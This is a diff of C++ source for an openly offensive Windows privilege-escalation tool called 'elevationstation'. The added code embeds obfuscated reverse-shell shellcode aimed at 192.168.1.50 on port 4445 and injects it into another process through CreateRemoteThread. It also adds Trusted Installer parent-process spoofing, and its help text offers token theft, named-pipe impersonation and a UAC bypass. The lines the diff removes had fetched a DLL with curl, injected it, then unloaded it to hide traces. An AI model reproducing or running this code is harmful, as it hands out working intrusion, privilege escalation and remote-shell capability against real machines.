@@ -11,6 +11,7 @@
 #include <userenv.h>
 #include <Dbghelp.h>
 #include <winternl.h>
+#include <TlHelp32.h>
 #include <psapi.h>
 #include "def.h"
 
@@ -227,118 +228,166 @@ BOOL NamedPipeImpersonate()
 }
 
 
-bool D11Inj3ct0r(DWORD pid)
+bool Inj3ct0r(DWORD pid)
 {
-    HMODULE hMods[1024];
-    //HANDLE hProcess;
-    DWORD cbNeeded;
-    unsigned int i;
+    //bitwise shift right encoding method
+    //ip: 192.168.1.50
+    //port: 4445
+    unsigned char b33fy[] =
+        "\x7e\x24\x41\x72\x78\x74\x60\x0\x0\x0\x20\x28\x20\x28"
+        "\x29\x28\x2b\x24\x18\x69\x32\x24\x45\x29\x30\x24\x45\x29"
+        "\xc\x24\x45\x29\x10\x24\x45\x39\x28\x24\x7\x5b\x25\x25"
+        "\x26\x18\x64\x24\x18\x60\x56\x1e\x30\x3e\x1\x16\x10\x20"
+        "\x60\x64\x6\x20\x0\x60\x71\x76\x29\x20\x28\x24\x45\x29"
+        "\x10\x45\x21\x1e\x24\x0\x68\x45\x40\x44\x0\x0\x0\x24"
+        "\x42\x60\x3a\x33\x24\x0\x68\x28\x45\x24\xc\x22\x45\x20"
+        "\x10\x24\x0\x68\x71\x2b\x24\x7f\x64\x20\x45\x1a\x44\x24"
+        "\x0\x6b\x26\x18\x64\x24\x18\x60\x56\x20\x60\x64\x6\x20"
+        "\x0\x60\x1c\x70\x3a\x78\x26\x1\x26\x12\x4\x22\x1c\x68"
+        "\x3a\x6c\x2c\x22\x45\x20\x12\x24\x0\x68\x33\x20\x45\x6"
+        "\x24\x22\x45\x20\xe\x24\x0\x68\x20\x45\x2\x44\x24\x0"
+        "\x68\x20\x2c\x20\x2c\x2f\x2c\x2d\x20\x2c\x20\x2c\x20\x2d"
+        "\x24\x41\x76\x10\x20\x29\x7f\x70\x2c\x20\x2c\x2d\x24\x45"
+        "\x9\x74\x2b\x7f\x7f\x7f\x2e\x24\x5f\x3b\x39\x19\x2f\x19"
+        "\x19\x0\x0\x20\x2b\x24\x44\x73\x24\x40\x76\x50\x0\x0"
+        "\x0\x24\x44\x72\x24\x5e\x1\x0\x8\x2e\x60\x54\x0\x19"
+        "\x20\x2a\x24\x44\x72\x26\x44\x78\x20\x5d\x26\x3b\x13\x3"
+        "\x7f\x6a\x26\x44\x75\x34\x0\x0\x0\x0\x2c\x20\x5d\x14"
+        "\x40\x35\x0\x7f\x6a\x28\x28\x26\x18\x64\x26\x18\x60\x24"
+        "\x7f\x60\x24\x44\x61\x24\x7f\x60\x24\x44\x60\x20\x5d\x75"
+        "\x7\x6f\x70\x7f\x6a\x24\x44\x63\x35\x8\x20\x2c\x26\x44"
+        "\x71\x24\x44\x7c\x20\x5d\x4c\x52\x3a\x30\x7f\x6a\x24\x40"
+        "\x62\x20\x1\x0\x0\x24\x5c\x31\x36\x32\x0\x0\x0\x0"
+        "\x0\x20\x28\x20\x28\x24\x44\x71\x2b\x2b\x2b\x26\x18\x60"
+        "\x35\x6\x2c\x20\x28\x71\x7e\x33\x63\x22\x12\x2a\x0\x0"
+        "\x24\x46\x22\x12\xc\x63\x0\x34\x24\x44\x73\x2b\x28\x20"
+        "\x28\x20\x28\x20\x28\x24\x7f\x60\x20\x28\x24\x7f\x64\x26"
+        "\x44\x60\x26\x44\x60\x20\x5d\x3c\x66\x1f\x43\x7f\x6a\x24"
+        "\x18\x69\x24\x7f\x65\x45\x7\x20\x5d\x4\x43\xe\x30\x7f"
+        "\x6a\x5d\x78\x5a\x51\x2b\x20\x5d\x53\x4a\x5e\x4e\x7f\x6a"
+        "\x24\x41\x62\x14\x1e\x3\x3e\x5\x40\x7d\x70\x3a\x2\x5d"
+        "\x23\x9\x39\x37\x35\x0\x2c\x20\x44\x6d\x7f\x6a";
 
-    cout << "[+] Downloading your dll from the elevationstation repo for the rev sh311 now!\n";
-    WinExec("curl -# -L -o \"c:\\users\\public\\mig2.dll\" \"https://github.com/g3tsyst3m/elevationstation/raw/main/d11inj3ction_files/mig2.dll\"", 0);
-    Sleep(3000);
-    //enable ALL necessary privs!!!
+    //keeps track of odd and even values since shifting right can make a bit negative or positive
+    //same with shifting left so we have to keep track of that sort of thing
+    unsigned int onesnzeros[] =
+
+    { 0,0,1,0,0,0,0,0,0,0,1,1,1,0,
+    0,1,0,0,1,0,1,0,1,0,0,0,1,0,
+    0,0,1,0,0,0,1,0,0,0,1,1,0,0,
+    1,1,1,0,1,0,0,0,1,0,0,0,0,1,
+    1,1,1,1,1,1,0,1,0,1,1,0,1,0,
+    0,1,0,0,0,1,0,1,0,0,0,0,0,0,
+    1,0,0,1,0,1,0,0,1,0,0,0,1,0,
+    0,1,1,0,1,0,0,1,1,1,1,0,0,0,
+    1,0,1,1,1,0,1,0,0,1,1,1,1,1,
+    1,1,0,0,1,1,0,1,0,0,0,1,1,1,
+    1,0,0,0,1,0,0,1,1,0,0,1,1,0,
+    0,0,1,0,0,1,1,0,1,1,0,0,0,1,
+    0,1,0,1,0,0,1,0,1,0,1,1,1,0,
+    0,1,0,0,1,0,1,0,0,1,1,0,0,1,
+    0,1,1,1,1,1,1,1,0,1,1,0,1,1,
+    0,0,0,1,0,1,1,0,0,1,0,0,1,0,
+    0,1,1,1,1,0,0,0,1,1,0,0,1,0,
+    1,0,1,1,0,0,1,1,1,0,0,1,0,1,
+    1,1,0,1,0,0,1,1,0,0,1,1,0,1,
+    0,1,0,1,1,0,0,1,1,1,1,1,0,0,
+    1,0,0,1,0,0,1,0,0,1,1,1,0,0,
+    1,1,0,1,1,0,1,1,0,0,1,0,0,1,
+    0,0,1,1,1,0,1,1,0,1,1,1,0,1,
+    0,0,0,0,0,1,0,1,1,0,0,0,0,0,
+    0,1,0,1,0,0,1,0,1,1,1,1,1,0,
+    0,1,1,1,0,0,0,0,1,0,0,0,1,1,
+    0,1,0,0,0,0,0,0,0,1,0,0,0,1,
+    0,1,0,1,0,1,1,0,1,0,1,1,0,1,
+    1,1,0,1,1,1,0,1,0,1,0,1,1,0,
+    1,0,0,1,0,1,0,1,0,0,1,1,0,1,
+    1,1,0,1,0,0,1,0,0,1,1,1,1,1,
+    0,1,0,0,0,0,0,0,0,1,0,1,1,1,
+    1,1,0,1,0,0,1,1,1,0,1,1 };
+
+    HANDLE hProcess = NULL;
+    HANDLE hToken = NULL;
+    LPVOID lpBuffer = NULL;
+    int iSize;
+    DWORD dwProcessId = 0;
+
+     //printf("size of buf: %d", sizeof(buf));
+
+    /* xor routine
+    char mycode[sizeof(buf)-1];
+    for (int i = 0; i < sizeof(mycode); i++)
+    {
+        mycode[i] = buf[i] ^ 99;
+        //printf("\%x", buf[i] ^ 99);
+    }
+    */
+
+ 
     setProcessPrivs(SE_DEBUG_NAME);
-    setProcessPrivs(SE_IMPERSONATE_NAME);
-    //priv enable routine complete
-    //BOOL bRet;
-    
-        HANDLE processHandle;
-        PVOID remoteBuffer;
-     
-        wchar_t dllPath[] = TEXT("C:\\Users\\public\\mig2.dll");
+    SIZE_T lpnumber = 0;
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProcess)
+        printf("[!] Failed to open the target process: %d\n", GetLastError());
+    else
+        printf("[+] Opened Process!: %d\n", pid);
 
-        printf("[+] Opening process handle for PID: %i\n", pid);
-        processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-        if (!processHandle)
+    BOOL bIsWow64 = FALSE;
+    if (!IsWow64Process(hProcess, &bIsWow64)) //execute the API
+    {
+        printf("[!] There was an issue executing the api against this PID: %d\n", GetLastError());
+    }
+
+    //printf("%s", bIsWow64 ? "true" : "false");
+
+    if (!bIsWow64)
+    {
+        printf("[+] PID %d is 64-bit!\n", pid);
+    }
+    else
+    {
+        printf("[!] PID %d is 32-bit and won't work with this program...\n", pid);
+        printf("[!] Can't inject into a 32-bit process...\n");
+    }
+
+    const int lenny = sizeof(b33fy) / sizeof(b33fy[0]);
+    char shifted[lenny];
+    //char shiftright[lenny];
+    for (int b = 0; b < lenny - 1; b++)
+    {
+        shifted[b] = b33fy[b] << 1;
+        if (onesnzeros[b] == 1)
         {
-            printf("[!] Need more priveleges to access...Error Code: %d\n", GetLastError());
-            exit(0);
+            //printf("1\n");
+            shifted[b] = shifted[b] + 1;
         }
+        //printf("back to original (shleft): x%02hhx\n", shifted[b]);
+        //printf("==================================\n");
 
-        BOOL bIsWow64 = FALSE;
-        if (!IsWow64Process(processHandle, &bIsWow64)) //execute the API
-        {
-            printf("There was an issue executing the api against this PID...Error Code: %i\n", GetLastError());
-            exit(0);
-        }
+    }
 
-        //printf("%s", bIsWow64 ? "true" : "false");
+    iSize = sizeof(shifted);
+    //printf("iSize = % d\n", iSize);
+    LPVOID vptr = (int*)VirtualAllocEx(hProcess, NULL, iSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    BOOL b = WriteProcessMemory(hProcess, vptr, shifted, iSize, &lpnumber);
+    if (!b)
+        printf("[!] Failed to Write to memory: %d\n", GetLastError());
+    else
+        printf("[+] Wrote Memory!\n");
+    HANDLE h = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)vptr, NULL, 0, 0);
 
-        if (!bIsWow64)
-        {
-            printf("[+] PID %d is 64-bit!\n", pid);
+    if (h == NULL)
+    {
+        printf("[!] Failed to execute $h311c0d3: %d\n", GetLastError());
+    }
+    else
+    {
+        printf("[+] Successful execution of $h311c0d3!!!\n");
+    }
 
-        }
-        else
-        {
-            printf("[!] PID %d is 64-bit and won't work with this program...\n", pid);
-            exit(0);
+    return 0;
 
-        }
-
-        printf("[+] Allocating memory in remote process...\n");
-        remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
-        if (!remoteBuffer)
-        {
-            printf("[!] Couldn't allocate memory: %d\n", GetLastError());
-            exit(0);
-        }
-        printf("[+] Writing memory to remote process...\n");
-        if (!WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL))
-        {
-            printf("[!] couldn't write memory...Error Code: %d\n", GetLastError());
-            exit(0);
-        }
-        printf("[+] Creating remote thread...\n");
-        PTHREAD_START_ROUTINE threadStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
-        if (!CreateRemoteThread(processHandle, NULL, 0, threadStartRoutineAddress, remoteBuffer, 0, NULL))
-        {
-            printf("[!] couldn't create remote thread...Error Code: %d", GetLastError());
-            exit(0);
-        }
-        printf("[+] Remote Process Injection completed successfully!!!\n");
-        printf("[+] Now, time to unload the injected dll to hide our tracks...\n");
-        Sleep(5000);
-
-        //close module handle to dll
-        if (EnumProcessModules(processHandle, hMods, sizeof(hMods), &cbNeeded))
-        {
-            for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
-            {
-                TCHAR szModName[MAX_PATH];
-
-                // Get the full path to the module's file.
-
-                if (GetModuleFileNameEx(processHandle, hMods[i], szModName,
-                    sizeof(szModName) / sizeof(TCHAR)))
-                {
-                    // Print the module name and handle value.
-                    if (_tcscmp(szModName, L"C:\\Users\\public\\mig2.dll") == 0)
-                    {
-                        printf("[+] found the dll within the injected process!\n");
-                        _tprintf(L"\t%s (0x%08X)\n", szModName, hMods[i]);
-
-                        
-                        PTHREAD_START_ROUTINE threadStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "FreeLibrary");
-                        if (!CreateRemoteThread(processHandle, NULL, 0, threadStartRoutineAddress, hMods[i], 0, NULL))
-                        {
-                            printf("[!] couldn't create remote thread...Error Code: %d", GetLastError());
-                            exit(0);
-                        }
-                        else
-                        {
-                            std::cout << "[+] CreateRemoteThread success and injected dll unloaded!  Enjoy your shell ;)\n";
-                            exit(0);
-                        }
-
-                    }
-                }
-            }
-        }
-
-
-        CloseHandle(processHandle);
+    CloseHandle(hProcess);
 
         return 0;
 }
@@ -409,143 +458,146 @@ int CheckProcessIntegrity(DWORD pid)
     return dwIntegrityLevel;
 }
 
-int LowerProcessIntegrity(DWORD pid, int integritylevel)
+int DupThreadToken(DWORD pid, bool ti)
 {
-    //enable SE_DEBUG!!!
-    //setProcessPrivs(SE_DEBUG_NAME); shouldn't need this, re-enable if you need to
-    //Enable SE_DEBUG routine complete
 
-    BOOL bRet;
-    HANDLE hToken;
-    HANDLE hNewToken;
-    //DWORD pid = pid;
-    HANDLE hProc;
+    if (ti)
+    {
 
+        DWORD tipid = {};
+        //pid = atoi(argv[1]);
+        HANDLE pHandle = NULL;
+        STARTUPINFOEXA si;
+        PROCESS_INFORMATION pi;
+        SIZE_T size = {};
+        BOOL ret;
 
-    WCHAR wszProcessName[MAX_PATH] =
-        L"C:\\Windows\\System32\\cmd.exe";
-    WCHAR wszIntegritySid[20];
+        //start Trusted Installer
+        WinExec("cmd.exe /c sc start TrustedInstaller", 0);
+        printf("sleeping for 5 seconds to allow TrustedInstaller service time to get started...\n");
+        Sleep(5000);
+        HANDLE hProcessSnap;
+        PROCESSENTRY32 pe32;
 
-    if (integritylevel == 0)
-    {
-        printf("The integrity level is already at the 'Untrusted Level'.  Can't drop it any further.\n");
-        exit(0);
-    }
-    if (integritylevel == 0x1000)
-    {
-        printf("The integrity level is already set to 'Mandatory Label\\Low Mandatory Level'.  not worth going lower...\n");
-        exit(0);
-    }
-    if (integritylevel == 0x2000)
-    {
-        printf("Integrity Level at 'Medium'.  Dropping to 'Low'\n");
-        wcscpy_s(wszIntegritySid, L"S-1-16-4096");
-    }
-    if (integritylevel == 0x3000)
-    {
-        printf("Integrity Level at 'High'.  Dropping to 'Medium'\n");
-        wcscpy_s(wszIntegritySid, L"S-1-16-8192");
-    }
-    if (integritylevel == 0x4000)
-    {
-        printf("Integrity Level at 'System'.  Dropping to 'High'\n");
-        wcscpy_s(wszIntegritySid, L"S-1-16-12288");
-    }
-
-    PSID pIntegritySid = NULL;
-
-    TOKEN_MANDATORY_LABEL TIL = { 0 };
-    PROCESS_INFORMATION ProcInfo = { 0 };
-    STARTUPINFO StartupInfo = { 0 };
-    ULONG ExitCode = 0;
-    DWORD dwCreationFlags = 0;
-    LPWSTR pwszCurrentDirectory = NULL;
-    LPVOID lpEnvironment = NULL;
-
-    hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (!hProc)
-    {
-        printf("[!] There was a permissions error opening the process w/ all access...: %d\n", GetLastError());
-    }
-    if (!OpenProcessToken(hProc, TOKEN_ALL_ACCESS, &hToken))
-    {
-        printf("[!] There was a permissions error applying all access to the token: %d\n", GetLastError());
-    }
-    if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hNewToken))
-    {
-        if (ConvertStringSidToSid(wszIntegritySid, &pIntegritySid))
+        // Take a snapshot of all processes in the system.
+        hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (hProcessSnap == INVALID_HANDLE_VALUE)
         {
-            TIL.Label.Attributes = SE_GROUP_INTEGRITY;
-            TIL.Label.Sid = pIntegritySid;
+            printf("CreateToolhelp32Snapshot error: %d\n", GetLastError());
+            return(FALSE);
+        }
 
-            // Set the process integrity level
-            if (SetTokenInformation(hNewToken, TokenIntegrityLevel, &TIL,
-                sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(pIntegritySid)))
+        // Set the size of the structure before using it.
+        pe32.dwSize = sizeof(PROCESSENTRY32);
+
+        // Retrieve information about the first process,
+        // and exit if unsuccessful
+        if (!Process32First(hProcessSnap, &pe32))
+        {
+            printf("Process32First error: %d\n", GetLastError()); // show cause of failure
+            CloseHandle(hProcessSnap);          // clean the snapshot object
+            return(FALSE);
+        }
+
+        do
+        {
+
+            if (wcscmp(L"TrustedInstaller.exe", pe32.szExeFile) == 0)
             {
-                dwCreationFlags = CREATE_UNICODE_ENVIRONMENT | CREATE_BREAKAWAY_FROM_JOB;
-
-                if (!(pwszCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
-                {
-                    wprintf(L"[!] setting pwszCurrentDirectory failed. Error: %d\n", GetLastError());
-                }
-                if (!GetSystemDirectory(pwszCurrentDirectory, MAX_PATH))
-                {
-                    wprintf(L"[!] GetSystemDirectory() failed. Error: %d\n", GetLastError());
-                }
-
-                if (!CreateEnvironmentBlock(&lpEnvironment, hNewToken, FALSE))
-                {
-                    wprintf(L"[!] CreateEnvironmentBlock() failed. Error: %d\n", GetLastError());
-                }
-                // Create the new process at Low integrity trying both methods
-                ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
-                StartupInfo.cb = sizeof(STARTUPINFO);
-                StartupInfo.lpDesktop = const_cast<wchar_t*>(L"WinSta0\\Default");
-
-                bRet = CreateProcessAsUser(hNewToken, NULL, wszProcessName, NULL, NULL, TRUE, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &StartupInfo, &ProcInfo);
-                if (bRet == 0)
-                {
-                    printf("[!] CreateProcessAsUser didn't cooperate...trying CreateProcesswithTokenW instead\n");
-                    printf("Return value: %d\n", GetLastError());
-                }
-                else
-                {
-                    printf("[+] CreateProcessAsUser worked!!!\n");
-                    printf("Return value: %d\n", bRet);
-                    fflush(stdout);
-                    WaitForSingleObject(ProcInfo.hProcess, INFINITE);
-                    //exit(0);
-                }
-
-
-                bRet = CreateProcessWithTokenW(hNewToken, NULL, NULL, wszProcessName, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &StartupInfo, &ProcInfo);
-                if (bRet == 0)
-                {
-                    printf("[!] CreateProcessWithTokenW didn't cooperate...hmmm not sure what's up there. Please review the Error code\n");
-                    printf("Return value: %d\n", GetLastError());
-                }
-                else
-                {
-                    printf("[+] CreateProcessAsUser worked!!!\n");
-                    printf("Return value: %d\n", bRet);
-                    fflush(stdout);
-                    WaitForSingleObject(ProcInfo.hProcess, INFINITE);
-
-                }
+                _tprintf(TEXT("\nProcess ID for TrustedInstaller: %d\n"), pe32.th32ProcessID);
+                tipid = pe32.th32ProcessID;
+                break;
             }
 
-            LocalFree(pIntegritySid);
-            CloseHandle(hProc);
+        } while (Process32Next(hProcessSnap, &pe32));
+
+        CloseHandle(hProcessSnap);
+
+        setProcessPrivs(SE_DEBUG_NAME);
+        // Open the TRUSTEDINSTALLER process so we can inherit the handle from it!
+        if ((pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, tipid)) == 0) {
+            printf("Error opening PID %d\n", tipid);
+            return 2;
         }
-        CloseHandle(hNewToken);
+
+        // Create our PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute
+        ZeroMemory(&si, sizeof(STARTUPINFOEXA));
+
+        InitializeProcThreadAttributeList(NULL, 1, 0, &size);
+        si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
+            GetProcessHeap(),
+            0,
+            size
+        );
+        InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
+        UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &pHandle, sizeof(HANDLE), NULL, NULL);
+
+        si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
+        si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
+        si.StartupInfo.wShowWindow = SW_HIDE;
+
+        // Finally, create the process
+        ret = CreateProcessA(
+            "C:\\WINDOWS\\System32\\cleanmgr.exe",
+            NULL,
+            NULL,
+            NULL,
+            true,
+            EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
+            NULL,
+            NULL,
+            reinterpret_cast<LPSTARTUPINFOA>(&si),
+            &pi
+        );
+
+        if (ret == false) {
+            printf("Error creating new process (%d)\n", GetLastError());
+            return 3;
+        }
+
+
+        HANDLE hProcessSnap2;
+        PROCESSENTRY32 pe322;
+
+        // Take a snapshot of all processes in the system.
+        hProcessSnap2 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (hProcessSnap2 == INVALID_HANDLE_VALUE)
+        {
+            printf("CreateToolhelp32Snapshot error: %d\n", GetLastError());
+            return(FALSE);
+        }
+
+        // Set the size of the structure before using it.
+        pe322.dwSize = sizeof(PROCESSENTRY32);
+
+        // Retrieve information about the first process,
+        // and exit if unsuccessful
+        if (!Process32First(hProcessSnap2, &pe322))
+        {
+            printf("Process32First error: %d\n", GetLastError()); // show cause of failure
+            CloseHandle(hProcessSnap2);          // clean the snapshot object
+            return(FALSE);
+        }
+
+        do
+        {
+
+            if (wcscmp(L"cleanmgr.exe", pe322.szExeFile) == 0)
+            {
+                _tprintf(TEXT("\nProcess ID for cleanmgr: %d\n"), pe322.th32ProcessID);
+                pid = pe322.th32ProcessID;
+                break;
+            }
+
+        } while (Process32Next(hProcessSnap2, &pe322));
+
+        CloseHandle(hProcessSnap2);
+
     }
-    CloseHandle(hToken);
-    return 0;
-}
 
 
-int DupThreadToken(DWORD pid)
-{
+
+
     setProcessPrivs(SE_DEBUG_NAME);
 
     BOOL bRet;
@@ -927,21 +979,20 @@ void uacbypass(char* theip, char* theport)
 //-WindowStyle hidden 
 void commandlist()
 {
-    printf("Options:\n -p 'process id'\n -cpi 'check process integrity'\n -d 'Technique: duplicate process token (spawns separate shell)'\n -dt 'Technique: duplicate process thread impersonation token and convert to primary token (spawns shell within current console!)'\n -np 'named pipe impersonation method'\n -uac 'uac bypass and elevate standard user (must be member of admin group)'\n -dll 'inject remote shell (port: 4445) into process via d11 inj3ct!0n!'\n -lcp '(!!!Experimental!!!) lower current process integrity by 1 (spawns shellz)'\n -l '(!!!Experimental!!!) lower another program's process integrity by 1 (spawns shellz)'\n");
+    printf("Options:\n -p 'process id'\n -cpi 'check process integrity'\n -d 'Technique: duplicate process token (spawns separate shell)'\n -dt 'Technique: duplicate process thread impersonation token and convert to primary token (spawns shell within current console!)'\n -np 'named pipe impersonation method'\n -ti 'Become Trusted Installer!'\n -uac 'uac bypass and elevate standard user (must be member of admin group)'\n -i 'CreateRemoteThread injection (reverse shell default config | port: 4445 / ip: 192.168.1.50)'\n");
     printf("usage: elevationstation.exe -p 1234 -cpi\n");
     printf("usage: elevationstation.exe -p 1234 -d\n");
     printf("usage: elevationstation.exe -p 1234 -dt\n");
     printf("usage: elevationstation.exe -np\n");
-    printf("usage: elevationstation.exe -uac attackerip port\n");
-    printf("usage: elevationstation.exe -p 1234 -dll\n");
-    printf("usage: elevationstation.exe -lcp\n");
-    printf("usage: elevationstation.exe -p 1234 -l\n");
+    printf("usage: elevationstation.exe -ti\n");
+    printf("usage: elevationstation.exe -uac [attackerip] [port]\n");
+    printf("usage: elevationstation.exe -p 1234 -i\n");
 }
 int main(int argc, char* argv[])
 {
     //printf("argc: %d", argc);
     DWORD pid;
-    if (argc == 1 || argc < 4 && strcmp(argv[1], "-lcp") != 0 && strcmp(argv[1], "-np") != 0 && strcmp(argv[1], "-uac") != 0 && strcmp(argv[1], "-h") != 0)
+    if (argc == 1 || argc < 4 && strcmp(argv[1], "-np") != 0 && strcmp(argv[1], "-uac") != 0 && strcmp(argv[1], "-ti") != 0 && strcmp(argv[1], "-h") != 0)
     {
         Color(2);
         printf("elevationstation.exe -h [lists all commands]\n");
@@ -955,17 +1006,7 @@ int main(int argc, char* argv[])
         printf("arg %d: %s\n", a, argv[a]);
     }
     */
-    if (strcmp(argv[1], "-p") == 0)
-    {
-        if (strcmp(argv[3], "-l") == 0)
-        {
-            pid = atoi(argv[2]);
-            int level = CheckProcessIntegrity(pid);
-            LowerProcessIntegrity(GetCurrentProcessId(), level);
-            exit(0);
-        }
-
-    }
+  
     if (strcmp(argv[1], "-h") == 0)
     {
         commandlist();
@@ -976,12 +1017,12 @@ int main(int argc, char* argv[])
         uacbypass(argv[2], argv[3]);
         exit(0);
     }
-    if (strcmp(argv[1], "-lcp") == 0)
+    if (strcmp(argv[1], "-ti") == 0)
     {
-        int level = CheckProcessIntegrity(GetCurrentProcessId());
-        LowerProcessIntegrity(GetCurrentProcessId(), level);
+        DupThreadToken(0, true);
         exit(0);
     }
+    
     if (strcmp(argv[1], "-np") == 0)
     {
         bool piperet=NamedPipeImpersonate();
@@ -995,24 +1036,21 @@ int main(int argc, char* argv[])
         if (strcmp(argv[3], "-d") == 0)
         {
             pid = atoi(argv[2]);
-            //DupToken method(pid);
             DupProcessToken(pid);
             exit(0);
         }
         if (strcmp(argv[3], "-dt") == 0)
         {
             pid = atoi(argv[2]);
-            //CheckProcessIntegrity(pid);
-            DupThreadToken(pid);
+            DupThreadToken(pid, false);
             exit(0);
         }
-        if (strcmp(argv[3], "-dll") == 0)
+        if (strcmp(argv[3], "-i") == 0)
         {
             pid = atoi(argv[2]);
-            D11Inj3ct0r(pid);
+            Inj3ct0r(pid);
             exit(0);
         }
-
 
     }
     if (strcmp(argv[1], "-p") == 0)
